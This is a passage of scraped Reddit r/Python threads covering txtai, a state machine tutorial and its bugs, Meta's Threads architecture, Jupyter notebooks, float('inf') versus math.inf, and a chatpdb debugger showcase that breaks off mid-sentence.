            "content": "txtai builds an AI-powered index over sections of text. txtai supports building text indices to perform similarity searches and create extractive question-answering based systems. GitHub repo: https://github.com/neuml/txtai Example notebooks: https://github.com/neuml/txtai#notebooks txtai is built on the following stack: sentence-transformers transformers faiss Python 3.6+"
        },
        {
            "author": "chromaticgliss",
            "score": "21",
            "content": "I'm still giggling about that sacrificing slower friends to a bear result."
        },
        {
            "author": "eazolan",
            "score": "50",
            "content": "\"I want a continuous stream of bad news.\""
        },
        {
            "author": "AlexK-",
            "score": "10",
            "content": "That looks aweosme! A question. Can you make/include a video on how to install and use it? It's kind of complicated, at least for me... I did pip-install it, but what do I do next? Thank you!"
        },
        {
            "author": "KILLsMASTER",
            "score": "5",
            "content": "Amazing! How many years have you been learning python for? Also, where and how many years into your python learning timeline did you learn about AI?"
        },
        {
            "author": "lampshade9909",
            "score": "6",
            "content": "This is cool. Have you tested it for NSFW results? I wonder how safe this would be to give to my kids, for example."
        },
        {
            "author": "Northside-shorty",
            "score": "2",
            "content": "Can I ask it questions? Pretty interesting project tho. For example can I ask it what is the weather for tomorrow or when is the next full moon?"
        },
        {
            "author": "uses_the_twice",
            "score": "2",
            "content": "I'm unable to install on windows 10, getting an error with the faiss-gpu installation. AttributeError: 'MSVCCompiler' object has no attribute 'compiler' I followed the windows instructions on the github page with no luck. Any advice? Seems like a very interesting package that I'd love to incorporate into a personal project of mine!"
        },
        {
            "author": "SuspiciousScript",
            "score": "2",
            "content": "The “tell me something dishonest” result is extraordinarily impressive."
        }
    ]
},
{
    "post_author": "pemidi",
    "post_id": "1c89uzp",
    "post_score": "22",
    "post_time": "Saturday, April 20, 2024 at 1:25:40 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Understanding State Machines in Python Through a Practical Example",
    "media": [
        "https://pemidi.hashnode.dev/understanding-state-machine-in-python"
    ],
    "post_content": "Hey everyone! I've written an article that simplifies the concept of state machines using Python, with a practical example related to order statuses. If you've ever been confused about state machines or just want a refresher with a real-world application, this might be just what you're looking for. Check it out and let me know what you think!\nRead the full article here\nI'm here for any questions or discussions",
    "comments": [
        {
            "author": "bce69",
            "score": "5",
            "content": "Thank you for doing this. I get errors when I try to run your code.. Invalid event: payment_received Invalid event: item_shipped Current state: pending",
            "replies": [
                {
                    "author": "arden13",
                    "score": "3",
                    "content": "The transition() method is improperly written. Since each method simply returns either itself or the next state I would refactor as new_state = self.states[self.current_state](event) if new_state == self.current_state: print(f\"Invalid Event: {event}\") else: self.current_state=new_state",
                    "replies": [
                        {
                            "author": "pemidi",
                            "score": "4",
                            "content": "Hey there. I made a mistake and edited my code right before it was published. Now fixed, the code functions properly. I appreciate your feedback.",
                            "replies": [
                                {
                                    "author": "arden13",
                                    "score": "1",
                                    "content": "Recommend putting a variable in the init to host that list but otherwise looks good."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "EternityForest",
            "score": "4",
            "content": "I have a state machine implementation here: https://github.com/EternityForest/scullery with unit tests that I use fairly often. It's an excellent programming model because it's declarative and fairly limited. There's just not much to go wrong, and everyone already understands the concept of \"An object can be in different states depending on what happens\". Water is, to an approximation, a state machine: Liquid > heat > steam Steam> cool> liquid Liquid> cool> ice Ice> heat> liquid"
        },
        {
            "author": "BogdanPradatu",
            "score": "3",
            "content": "Guy wrote an article, didn't even run the code. Is this AI generated?"
        },
        {
            "author": "JamzTyson",
            "score": "2",
            "content": "Hey everyone! I've written an article Is your name ChatGPT?"
        },
        {
            "author": "kazza789",
            "score": "1",
            "content": "I think you need to take a look at your code again. States are functions in your example, but you try to call them like they are a dictionary."
        },
        {
            "author": "JennaSys",
            "score": "1",
            "content": "In the transition() method, the check for a valid event doesn't seem to make sense: if event in self.states[self.current_state]: Unless I'm missing something, this appears to be trying to check the event string for membership in a function reference. Maybe it would make more sense to define a list of valid events and check for membership in that? events = [\"payment_received\", \"item_shipped\", \"item_delivered\"] if event in events: And I think the line that executes the transition should have parenthesis around the event variable not square brackets so that the event gets passed to the function as an argument: self.current_state = self.states[self.current_state](event)",
            "replies": [
                {
                    "author": "pemidi",
                    "score": "2",
                    "content": "Hey there. I made a mistake and edited my code right before it was published. Now fixed, the code functions properly. I appreciate your feedback."
                }
            ]
        },
        {
            "author": "ignamv",
            "score": "1",
            "content": "In many cases (if you're not serializing/deserializing the state) you can avoid writing awkward explicit state machines by just using coroutines, which are much easier to read."
        }
    ]
},
{
    "post_author": "mittwochmensch",
    "post_id": "bu4shw",
    "post_score": "1766",
    "post_time": "Tuesday, May 28, 2019 at 11:04:55 PM GMT+3",
    "flair_text": "",
    "post_title": "My simulation of gravity with 1000 particles. PC took a couple of hours to process!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "123",
            "content": "Do the weights of the particles add up? Can you end up having a solar system that doesn't collapse?"
        },
        {
            "author": "mischiefunmanagable",
            "score": "39",
            "content": "animated QRcodes"
        },
        {
            "author": "blinkallthetime",
            "score": "27",
            "content": "if you are trying to make your simulation faster, you should look into running the numerical stuff in C instead of python. my job is to do brain simulations, and this is a thing that i do for performance for my numerical integration. i organize my simulations and handle visualization in python, but C does the heavy lifting. you should look into numpy, which is a python module for numerical arrays. if you are interested in extending your simulations with C, you should look into ctypes, which is the python module to interact with compiled C code. the idea would be to define your state variables in a numpy array. you can get a C pointer for a numpy array which allows you to operate on that array in C. I usually do my whole simulation in C, but i have way fewer state variables than you. you could do your simulations like 100 steps at a time in C and then save an image in python."
        },
        {
            "author": "Kamilon",
            "score": "27",
            "content": "Can you post the code?"
        },
        {
            "author": "White_Lion2",
            "score": "6",
            "content": "Github? :D"
        },
        {
            "author": "Nicksil",
            "score": "6",
            "content": "How has this thread gone on for so long without the source code having been posted? Post the source code, please."
        },
        {
            "author": "ThommyKB",
            "score": "5",
            "content": "Looks neat. What do you use for visualising it, Tkinter?"
        },
        {
            "author": "tbunde01",
            "score": "5",
            "content": "The size of the particles appears to be capped at some (arbitrary?) max. Does the \"mass\" of these particles continue to grow with each collision even after the size hits its max value?"
        },
        {
            "author": "thoraldo",
            "score": "8",
            "content": "Source?"
        },
        {
            "author": "debazthed",
            "score": "4",
            "content": "There was an interesting talk about this exact topic at Pycon.de 2017. You can check the video.out here."
        }
    ]
},
{
    "post_author": "rgancarz",
    "post_id": "1c4u5ml",
    "post_score": "120",
    "post_time": "Monday, April 15, 2024 at 9:52:13 PM GMT+3",
    "flair_text": "News",
    "post_title": "Meta Used Monolithic Architecture Using Python to Ship Threads in Only Five Months",
    "media": [
        "https://www.infoq.com/news/2024/04/meta-threads-instagram-5-months/"
    ],
    "post_content": "https://www.infoq.com/news/2024/04/meta-threads-instagram-5-months/\nZahan Malkani talked during QCon London 2024 about Meta's journey from identifying the opportunity in the market to shipping the Threads application only five months later. The company leveraged Instagram's existing monolithic architecture, written in Python and PHP, and quickly iterated to create a new text-first microblogging service in record time.",
    "comments": [
        {
            "author": "ShakataGaNai",
            "score": "153",
            "content": "Turns out you can do anything, with anything. You can deploy a monolith for a hugely popular application quickly. You can also build a shitty one quickly. You can do a great job with microservices, you can make your life hell with microservices. The lesson taken away from this article should be: There is no one size fits all solution. Do what makes sense for your team and your application. If a hybrid monolith w/ microservice helper running qbasic gets your shit done... and it's maintainable.... go for it.",
            "replies": [
                {
                    "author": "Smallpaul",
                    "score": "6",
                    "content": "Turns out you can do anything, with anything. No, I can imagine a variety of programming languages and frameworks that would make it practically impossible to ship a high-scale web app in five months. COBOL, C, MatLab, REXX, QBasic, maybe (?) Haskell. And you would be surprised at the number of people who would include \"Python monolith\" in that list. So they've done us a favour by telling us that \"No, Python monolith is not on that list. It works.\" If someone launched a Haskell site of that scale I would want them to publish that too, because personally, I'm not sure which list Haskell belongs on. I would be extremely fascinated if someone launched such a site with QBasic. Never, in a million years, would I copy them, but I would be astonished to hear it is possible. You actually cannot \"do anything, with anything\". As some troll in the Reddit thread below tried to point out, you probably cannot build a scalable and efficient back-end database with Python. That's not what it's good for. This kind of article is excellent for helping us find those boundaries."
                }
            ]
        },
        {
            "author": "gGonzOfficial",
            "score": "61",
            "content": "Despite the apparent advantages of reusing Instagram's platform for Threads (much faster delivery time), Malkani admitted the company introduced a substantial amount of technical debt that must be addressed in the future. I think Threads will be dead way sooner before someone wants to invest time on fixing the tech debt.",
            "replies": [
                {
                    "author": "shukoroshi",
                    "score": "4",
                    "content": "Exactly. That's why they call it debt. If they're able to operate at an acceptable margin in terms of dev velocity, upkeep, and operational overhead, so be it."
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "35",
            "content": "this is of course not useful advice to anyone that isn’t meta, unless you’re another company with a one billion user social network system sitting around to crib from. the problem with architecture meta-discussion is fundamentally you need taste and experience and luck to make good architectural choices, but that’s only ten words and infoq won’t publish it as an article and HN and Reddit won’t fawn over it. so, I’ll give you the some good advice without even any display ads: try lots of things and keep a note book of what you’ve done, how it went, why you think it went like that and what you’ve learnt, what you will do differently and what essence you’ve distilled from that outcome.",
            "replies": [
                {
                    "author": "Cryonixx2",
                    "score": "8",
                    "content": "Creating ADRs is a great practice for any developer to follow: https://github.com/joelparkerhenderson/architecture-decision-record/tree/main/locales/en/templates/decision-record-template-by-michael-nygard"
                },
                {
                    "author": "Smallpaul",
                    "score": "1",
                    "content": "We can't decide as an industry to only learn from personal experience."
                },
                {
                    "author": "DigThatData",
                    "score": "1",
                    "content": "Nah. Even if the solution they built isn't directly relevant to anyone who isn't them, the reasoning for their choices and the process they used to design the system and evaluate their decisions nearly always contains nuggets that are relevant across problem domains."
                }
            ]
        },
        {
            "author": "robberviet",
            "score": "4",
            "content": "Meta use PHP, Python for years. They even has their own version of CPython (Cinder), PHP(Hack) that tweaked in their needs. What is the surprising factor here?"
        },
        {
            "author": "pan0ramic",
            "score": "9",
            "content": "Would be more impressive if threads was a success"
        },
        {
            "author": "Carpinchon",
            "score": "7",
            "content": "Most of us don't just make \"websites\" do we? I guess monoliths are fine for that. I'm usually working on some complicated ancillary system that deals with multiple inputs and outputs, only some of which are websites. Monolith isn't even an option, and at least in my experience, that scenario is way more common. Even with this example... Meta didn't reinvent their own auth for threads or for putting ads in your face or for hosting those ads... They used a whole ton of services they had already written."
        },
        {
            "author": "Hey_Look_80085",
            "score": "9",
            "content": "Threads’ failure to maintain its early momentum is indicative of both design flaws and larger network effects, experts say."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c8bxz5",
    "post_score": "4",
    "post_time": "Saturday, April 20, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Embarrassed-Mix6420",
            "score": "1",
            "content": "Looking for: Decent full tutorials for Python GUI frameworks that are used in production Official documentation/video Personal experience recommendations are best Should be better then https://www.youtube.com/watch?v=l8Imtec4ReQ&t=1312s and https://www.youtube.com/watch?v=Jn0PpzB14Y8&t=327s Both PySide and Kivy have issues The drawbacks of PySide is that it doesn't support mobile (which C++ foundation actually does with Android) The drawback of Kivy is its event loop management, documentally undefined behavior with multiple weird aliases and names for same or slightly different things which end up being complete PitA - overall it's founded by a single french freelance guy who coded it their way and quickly without it being a production viable robust framework with end-user detail and configurability in mind Any expert advice is appreciated"
        },
        {
            "author": "GoldenTreasure1",
            "score": "1",
            "content": "https://python-fiddle.com This is a cool thing I found, while searching the web. Anyways i thought it was pretty cool"
        }
    ]
},
{
    "post_author": "thelochok",
    "post_id": "1c69jns",
    "post_score": "19",
    "post_time": "Wednesday, April 17, 2024 at 4:14:22 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ScrumMD: A CLI Scrum tool written in Python",
    "media": [
        "https://github.com/lkingsford/scrummd",
        "https://scrummd.readthedocs.io/en/stable/"
    ],
    "post_content": "I got grumpy with our Scrum process, and I thought about what kinda tool I'd love to work with... so I started making it in my beloved Python. I think it's mature enough I'd like to start giving it to other people.\nIt's called ScrumMD. It's open source, and you can already install it with pip (pip install scrummd) if you've got Python 3.10+. Documented, with tutorials on https://scrummd.readthedocs.io/en/stable/ and source on https://github.com/lkingsford/scrummd\nWhat my project does\nShort version is that it's some tools to support you storing all of your Scrum cards (or, I guess, other cards - tickets perhaps?) in markdown format on a local machine. There's intentionally a lot of flexibility - so, every card needs a summary, but everything else is fair game. You can configure to require fields for some collections (like needing status in stories), or limit fields (like requiring status be 'Done' or 'In Progress').\nTarget Audience\nLimited, but public. It's chief audience is software engineers who work in self-organising teams. It's for teams who use processes like Scrum, but don't need the bureaucracy layers.\nHonestly - I know it's niche. Heck, I won't even be using it at work myself. But, if I could, I would - because I actually like using it.\nComparison\nI'm not aware of any CLI tools that do this kinda thing - particularly with local markdown files. The chief tool it would replace is a project/scrum management tool like Jira, or an issue tracker like the one that comes with GitHub. Both of those are far more friendly to a non-technical audience than ScrumMD is.\nTechnical things\nTechnically - it's pretty darned vanilla.\nThe only non-included bits I'm using are a toml library on Python 3.10, Sphynx for Doco, Setup Tools and Pytest. I use Pylint and Mypy for my own sake. Wasn't anything technically novel going on - although it's the first time I've tried submitting anything to PyPi myself.\nIt's been fun to try setting up CI in GitHub - I'd used a number of other CI/CD frameworks, but I think I like GitHub actions.\nHappy to talk through anything I've done here, and would really be genuinely pleased to be forced to talk my way through any design decisions or hear ways I could have structured it better.",
    "comments": [
        {
            "author": "skeerp",
            "score": "18",
            "content": "Itd be cool if this hooked up to Jira so I could use a CLI instead of clicking 1000 UI elements every meeting",
            "replies": [
                {
                    "author": "thelochok",
                    "score": "2",
                    "content": "I'd love to make that work. Not going to be able to happen just at the sec though - but the code should be highly hackable, or, alternatively, get some funk happening by syncing Jira to markdown outside of scrummd itself. I have started trying to think about how this could happen... but between work and baby, not going to promise anything."
                },
                {
                    "author": "UraniumButtChug",
                    "score": "2",
                    "content": "There are several Jira CLI apps as well as vim plugins"
                }
            ]
        },
        {
            "author": "Valuable-Kick7312",
            "score": "2",
            "content": "Looks nice! 👍🏼"
        }
    ]
},
{
    "post_author": "cnovrup",
    "post_id": "c9xxes",
    "post_score": "1854",
    "post_time": "Saturday, July 6, 2019 at 11:01:11 PM GMT+3",
    "flair_text": "",
    "post_title": "From the Netflix series \"Family Business\". I rate it 10/10 for realism",
    "media": [
        "https://i.redd.it/0iqw1mu0oq831.png",
        "https://preview.redd.it/0iqw1mu0oq831.png?width=640&crop=smart&auto=webp&s=d209ff2867e9a2df18fafc2e53423b17be0ce149"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "sadhith63",
            "score": "207",
            "content": "they mention actual programming in a show and not a guy mashing a green screen? Damn"
        },
        {
            "author": "C0c04l4",
            "score": "157",
            "content": "In fact they're talking about a mobile app, so it would most probably be in Objective-C/Swift or Kotlin/Java. Not sure it's even possible to have a mobile app in python..."
        },
        {
            "author": "3nigma42",
            "score": "159",
            "content": "I don't get it, is that supposed to be a joke, I love python, but surely javascript is more standard right?"
        },
        {
            "author": "supermario182",
            "score": "10",
            "content": "it would be nice if they made a type of pythonscript for browsers that didnt suck like javascript"
        },
        {
            "author": "zalpha314",
            "score": "17",
            "content": "Lol, this is why you don't let business people make technical decisions."
        },
        {
            "author": "LongCPGandTelecom",
            "score": "14",
            "content": "Java = JSON = JavaScript"
        },
        {
            "author": "lotekness",
            "score": "9",
            "content": "So we're pretending people aren't doing end to end js these days? Because I'm cool living in that world and all, but it's not this one."
        },
        {
            "author": "6c696e7578",
            "score": "3",
            "content": "Does anyone have the clip?"
        },
        {
            "author": "_eka_",
            "score": "4",
            "content": "Wat? https://www.destroyallsoftware.com/talks/wat"
        },
        {
            "author": "ichbinoffend44",
            "score": "2",
            "content": "Surprising! Didn't think Hollywood knew about Python.👍👍"
        }
    ]
},
{
    "post_author": "SubstantialRange",
    "post_id": "hp7uqe",
    "post_score": "1762",
    "post_time": "Saturday, July 11, 2020 at 1:29:54 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Concept Art: what might python look like in Japanese, without any English characters?",
    "media": [
        "https://www.reddit.com/r/ProgrammingLanguages/",
        "https://www.reddit.com/r/ProgrammingLanguages/comments/g9iu8x/concept_art_what_might_python_look_like_in/",
        "https://preview.redd.it/ulc23n21jiv41.png?width=640&crop=smart&auto=webp&s=496fec77ca6bb2b285163a595793178296b5d0d8",
        "https://i.redd.it/ulc23n21jiv41.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "mathishammel",
            "score": "387",
            "content": "What's that println heresy on the right ?",
            "replies": [
                {
                    "author": "Wilfred-kun",
                    "score": "40",
                    "content": "What's that unnecessary if-else doing there?"
                }
            ]
        },
        {
            "author": "morimo",
            "score": "157",
            "content": "I can guarantee that if someone were to write a programming language in Japanese, the keywords would not be in katakana. Edit: katakana not kana"
        },
        {
            "author": "ojii",
            "score": "95",
            "content": "I'd suggest something more along the lines of this: 比べ（あ、い）　は： テキスト　＝　「こんにちは」 あ＋い＞４　なら： 正　返す それとも： 不正　返す 比べ（５、６）　刷る"
        }
    ]
},
{
    "post_author": "IllogicalLunarBear",
    "post_id": "1c726ka",
    "post_score": "0",
    "post_time": "Thursday, April 18, 2024 at 3:32:49 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Why Jupyter notebook",
    "media": [
        "https://pypi.org/project/data-nut-squirrel/"
    ],
    "post_content": "I did a search and read previous discussions in this sub about why Jupyter labs exists. From what I understand it is for quick code to try things out especially in data science …. Thing is, can’t you get the same thing via a decent IDE with autocomplete and quality debug tools in some quick Python code like in VSCODE? I do that all the time….\nI develop RNA computational software in Python and I abandoned Jupyter labs very early on as it just was not well suited to the job of bespoke data science. So many limitations and don’t get me started with widgets… I’ve been developing code for decades and I have spent 3 days trying to understand widgets and I think I finally understand how to modify a text box and get a value from it…. You have to observe (why?), then act on, then route through some output and then you can get the info? It’s like someone was drunk while trying to emulate visual C#.\nEdit: before anyone else tells me to read vscode docs like I’m an idiot… I am unable to remote into the repo I’m using now for reasons. Not everyone can remote in and the question is not about remoting in. It’s still garbage in VSCODE… just use regular python.\nEdit2: for everyone who says they use it to do chunks of code work… I developed my own data management system for that kind of stuff that provides a wrapper over serialization that essentially creates pythonic pointers to data on any network drive. I just grab my data that I want to grab. Provides autocomplete and C# like attributes. I can dynamically build any data storage class using UML formatted infrastructure-as-code to build the front end. The back end is completely dynamic. Here is the pypi link. Note that I developed this to handle genomic data that was generated over the course of a week of 24/7 computation.\nhttps://pypi.org/project/data-nut-squirrel/",
    "comments": [
        {
            "author": "RedMaskedMuse",
            "score": "168",
            "content": "My use cases for Jupyter are: executable documentation (show how an algorithm works piece-by-piece, with markdown sections in between code sections; also works for lab reports with post-processing) rapid prototyping (quickly iterate on pieces of an algorithm without having to re-execute the rest of the code - especially important if some of the steps are slow) tutorials (allows the student to work through code piece-by-piece while being able to see text, image, or plot results in between sections) It isn't the right tool for everything, but it does come in handy for some tasks. It's a partner to an IDE, not a replacement."
        },
        {
            "author": "jjrreett",
            "score": "24",
            "content": "I use jupyter like a repl. It’s great for problems that have a major IO operation then lots of exploration to figure out how to process and visualize. Plus the —to-html/pdf functionality is great. Makes making reports super easy. For what jupyter is good at, there really isn’t anything like it."
        },
        {
            "author": "iMDu093",
            "score": "37",
            "content": "Sounds like you have a cool job. Yeah I don’t think Jupyter is the best choice for building software. Nobody would argue that. But it’s quite nice for EDA and creating reports/presentations. You can save your notebook as an html file, pdf, md, etc. Why Jupyter? It’s like asking why would anyone have a desktop when you can carry a laptop. Different tools are for different things. Use whatever IDE you like, nobody is forcing you. Sounds like you had a rough time trying to get some things going in Jupyter. And if you dislike it this much, I pray that you never have to touch a databricks notebook hahahaha",
            "replies": [
                {
                    "author": "czar_el",
                    "score": "6",
                    "content": "This is the answer. Jupyter is not intended as a software development tool or a computational model building tool. It is a communication tool. Rapid collaborative prototyping or EDA, presentations, audit trails, or tutorials, all aimed at non-expert audience greatly benefit from Jupiter's ability to mix markdown cells with code/output cells, as well as the ability to quickly share in many formats, some of which (like HTML) do not require the recipient to have Jupyter."
                }
            ]
        },
        {
            "author": "ConcreteExist",
            "score": "30",
            "content": "Jupyter Notebooks aren't typically for writing software, they're for doing data analysis and documenting your process as you go along. I wouldn't use one to do actual development work though."
        },
        {
            "author": "KingsmanVince",
            "score": "18",
            "content": "You can use jupyter notebooks in vscode and still get autocomplete. Besides reading previous discussion, I suggest you read the docs https://code.visualstudio.com/docs/datascience/jupyter-notebooks"
        },
        {
            "author": "nemom",
            "score": "9",
            "content": "I don't use VScode so I don't know if it works the same. Jupyter is interactive. You don't just run a program from start to finish and exit, you run the cells step-by-step. All results are available for further computations... If you have a large data file, you can read it in once, then explore it. If you make a mistake, you just edit the cell and re-run it. When you have the steps all worked out, you can export to a stand-alone program to run anytime you want.",
            "replies": [
                {
                    "author": "Spin-Stabilized",
                    "score": "6",
                    "content": "This. This is exactly where it has been fantastic for me. I have notebooks for analysis of large sets of telemetry data. On the order of a gigabyte per day. If I want just a couple days worth of data, it takes a couple minutes to read it into a data frame. If I want the whole set since launch, you’re talking a couple hours. With Jupyter I read it in once and now that it is available to further cells I can modify my code without waiting for data to be read in again. I can quickly share plots out of the data and go back for quick manipulations based on feedback. If I then find that I need to run the same code on a regular basis, I port it out to a python file, wrap it with a script, and I’m all set. I think of it like Matlab for other languages."
                }
            ]
        },
        {
            "author": "sirjackholland",
            "score": "9",
            "content": "Why are you trying to set up widgets when you're just learning how to use notebooks? Declare the variables at the top and call it a day. Then, when you're more comfortable with notebooks, you can make them fancier by adding widgets if doing so actually improves the functionality (many notebooks have no need for them)."
        },
        {
            "author": "BranchLatter4294",
            "score": "6",
            "content": "If you don't have a use case for notebooks, don't use them. Many people find them helpful. And it's not just for Python. VS Code has good support for notebooks in other languages as well."
        }
    ]
},
{
    "post_author": "Librarian-Rare",
    "post_id": "1c4x7b7",
    "post_score": "79",
    "post_time": "Monday, April 15, 2024 at 11:50:48 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "float('inf') is bad practice",
    "media": [],
    "post_content": "I don't know why float('inf') was chosen as the way the language accesses infinity since this is using a magic string. Why couldn't it just be float.inf? That way magic string is avoided. Feels too basic of a best practice to be simply passed up. Anyone know the reason behind this?",
    "comments": [
        {
            "author": "j_marquand",
            "score": "198",
            "content": "math.inf is there for you, and I prefer it over float('inf') in most if not all cases."
        },
        {
            "author": "the_hoser",
            "score": "112",
            "content": "it's not magic. It's just a printable value. The <number_type>(str) and str(<number_type>) constructors are intentionally compatible with each other. I'm not certain, but the value 'inf' is likely to be compatible with the C library Python is built on top of. Consider the following C code: #include <stdlib.h> #include <math.h> #include <assert.h> int main(int argc, char** argv) { float f = atof(\"inf\"); assert(f == INFINITY); } Use math.inf if you don't want to use strings.",
            "replies": [
                {
                    "author": "Librarian-Rare",
                    "score": "6",
                    "content": "Thanks for this!! Didn't realize that there was a math.inf Will definitely be using this from now on. Thanks!!"
                }
            ]
        },
        {
            "author": "metaphorm",
            "score": "52",
            "content": "I prefer float('inf') because that's the same form as the constructor for a float. its the same form as float('42'). consistency is good.",
            "replies": [
                {
                    "author": "Zomunieo",
                    "score": "25",
                    "content": "float(‘42’) == float(‘inf’), if you think about it."
                },
                {
                    "author": "PaintItPurple",
                    "score": "2",
                    "content": "I wouldn't recommend writing float('42') either. In both cases, constants are a much better choice."
                }
            ]
        },
        {
            "author": "JamzTyson",
            "score": "8",
            "content": "The notation float('inf') was part of PEP-754. Although this PEP was ultimately rejected, several ideas from the PEP were implemented in Python 2.6, including float('inf') and repr(float('inf')). There is some discussion about \"why\" in the PEP if you are particularly interested. I don't see a compelling argument for adding methods to the float class for inf, -inf, or nan, since we already have those methods in math."
        },
        {
            "author": "rghthndsd",
            "score": "11",
            "content": "If you're going to call this \"bad practice\", then I'd ask for you to be transferred off my project. If not for my sake, then yours. For the record: I'm exaggerating a bit.",
            "replies": [
                {
                    "author": "MyKo101",
                    "score": "4",
                    "content": "Yeah, but only a bit"
                },
                {
                    "author": "Librarian-Rare",
                    "score": "5",
                    "content": "Only problem I really see with it is that the machine can only catch float('ifn') during runtime. Whereas math.ifn can be caught immediately."
                }
            ]
        }
    ]
},
{
    "post_author": "Gedanke",
    "post_id": "b9xcit",
    "post_score": "1853",
    "post_time": "Saturday, April 6, 2019 at 1:07:06 AM GMT+3",
    "flair_text": "",
    "post_title": "Using python to map the traffic that came to my server after my post hit the front page.",
    "media": [
        "https://i.redd.it/11a6sisopiq21.png",
        "https://preview.redd.it/11a6sisopiq21.png?width=640&crop=smart&auto=webp&s=eca6e74cdba02afd1b9ca7100f1beee799fbe858"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "mostlowkey1",
            "score": "206",
            "content": "I’ve been following r/python for a long time just because I’ve been really interested in learning it and I knew seeing various posts would inspire me. There was something about seeing this that made me realize I do think data visualization is super cool and I think you just gave me the final push to get started!"
        },
        {
            "author": "Gedanke",
            "score": "88",
            "content": "I wrote a python script that analyses my NGINX access.log and creates this map using d3.js . This is the post in question if anyone is wondering. You can find the code @ Github"
        },
        {
            "author": "[deleted]",
            "score": "20",
            "content": "Did you have trouble mapping hits from China?"
        },
        {
            "author": "MotherfuckerTinyRick",
            "score": "29",
            "content": "I can see my house from here"
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "South Korea loved it! North Korea not so much."
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "What's that one point in central greenland? There should be nothing but ice afaik."
        },
        {
            "author": "jhdeval",
            "score": "6",
            "content": "I think it would interesting to see time of day as well. Not sure if it would work but you may see a wave as it traverses the timezones."
        },
        {
            "author": "zandiz",
            "score": "5",
            "content": "I want to know who that one nerd in Libya is"
        },
        {
            "author": "ihitcows",
            "score": "4",
            "content": "That one dot in China really stands out."
        },
        {
            "author": "liesliesfromtinyeyes",
            "score": "3",
            "content": "You have a point in what could be Punta Arenas, Chile. I wonder if that’s an American down for deployment to Antarctica with the US Antarctic Program..."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c6pauh",
    "post_score": "1",
    "post_time": "Thursday, April 18, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "5z1bsn",
    "post_score": "1758",
    "post_time": "Monday, March 13, 2017 at 1:14:21 AM GMT+3",
    "flair_text": "",
    "post_title": "He's a Parsertongue.",
    "media": [
        "https://i.redd.it/vnoncsyyw1ly.png",
        "https://preview.redd.it/vnoncsyyw1ly.png?auto=webp&s=138abafe89456f4dc5ec0fc53083d9c617696324"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Helix_van_Boron",
            "score": "122",
            "content": "A lot of that syntax won't work in all caps, though."
        },
        {
            "author": "[deleted]",
            "score": "21",
            "content": "I guess you could call them sourcerers"
        },
        {
            "author": "BronzeOne",
            "score": "13",
            "content": "Been doing python for three years, i don't get it :("
        },
        {
            "author": "gandalfx",
            "score": "48",
            "content": "ancient"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "Am I missing a joke here or is the code just incomplete gibberish that has nothing to do with the task at hand?"
        },
        {
            "author": "luckystarr",
            "score": "3",
            "content": "Would have been more fun if the code did something with the ast module. :)"
        },
        {
            "author": "Deto",
            "score": "15",
            "content": "PSH, he's barely fluent! Should be: IGNORE_SET = {\"__INIT__.py\", \"COUNT_SOURCELINES.PY\"}"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "Read this as I'm watching Chamber of Secrets"
        },
        {
            "author": "heavyheaded3",
            "score": "4",
            "content": "*parser-mouth"
        },
        {
            "author": "hhh333",
            "score": "3",
            "content": "I don't get it and I'm not sure I want to get it."
        }
    ]
},
{
    "post_author": "the1024",
    "post_id": "1c7abe8",
    "post_score": "0",
    "post_time": "Thursday, April 18, 2024 at 9:15:02 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "chatpdb - gpt for your python debugger",
    "media": [
        "https://github.com/shobrook/stackexplain",
        "https://github.com/gotcha/ipdb",
        "https://github.com/Never-Over/chatpdb",
        "https://docs.python.org/3/library/pdb.html"
    ],
    "post_content": "https://github.com/Never-Over/chatpdb\nDo you ever copy code, errors, or stack traces into ChatGPT? We did, and found it frustrating to always have to manually find, copy, and paste each relevant piece of information. On top of that, being forced to change tools would switch our focus and cause us to lose our flow. That’s why we built chatpdb  - a python debugger with ChatGPT!\nSimply use chatpdb like you would use ipdb or pdb; it’s a drop in replacement with the exact same functionality. The only addition is the new y keyword, which will trigger a response from ChatGPT.\nHere’s how it works:\n> /Programming/test-chatpdb/lib.py(2)echo_platform()\n      1 def echo_platform(platform: str):\n----> 2     print(\"You are running on:\" + platform)\n      3\nipdb> y \nThe exception occurred because the function `echo_platform` tries to concatenate the string \"You are running on:\" with the `platform` variable, which is `None`. [...]\nIn this example, chatpdb correctly diagnoses an error in the current function as being caused by a bug in the calling function. chatpdb automatically passes relevant context about your program, including the source code, stack trace, and error information if available to ChatGPT.\nIf you have a more specific question you can also supply a prompt to y:\n> /Programming/test-chatpdb/lib.py(2)echo_platform()\n      1 def echo_platform(platform: str):\n----> 2     print(\"You are running on:\" + platform)\n      3\nipdb> y \"Why is platform coming through as None?\"\nThe variable `platform` is coming through as `None` because the environment variable `\"PLATFORM\"` is not set in your system's environment variables. [...]\nIt’s easy to install and set up:\npip install chatpdb\nexport OPENAI_API_KEY=....\nimport chatpdb\nchatpdb.set_trace()\nWhat my project does: A drop-in replacement for ipdb or pdb, with ChatGPT built in.\nTarget audience: anyone who currently uses ChatGPT to debug or ask questions about their code.\nComparison: Copilot offers similar functionality, but is a much heavier tool and harder to turn off/ignore when you don’t want it. stackexplain is probably the closest 